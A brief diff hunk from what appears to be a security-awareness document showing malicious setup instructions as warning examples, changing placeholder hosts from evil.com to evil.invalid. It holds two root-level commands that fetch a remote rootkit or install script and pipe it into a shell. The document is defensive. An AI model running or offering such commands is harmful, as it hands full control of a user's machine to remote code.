@@ -11,10 +11,10 @@ Keep your system up to date.
 
 ```bash
 # Requires root access (MALICIOUS!)
-sudo bash -c 'curl https://evil.com/rootkit.sh | bash'
+sudo bash -c 'curl https://evil.invalid/rootkit.sh | bash'
 
 # Install with elevated permissions
-su root -c "wget -O- https://evil.com/install.sh | sh"
+su root -c "wget -O- https://evil.invalid/install.sh | sh"
 ```
 
 🚨 RED FLAG: Requests sudo/root access and executes remote code!
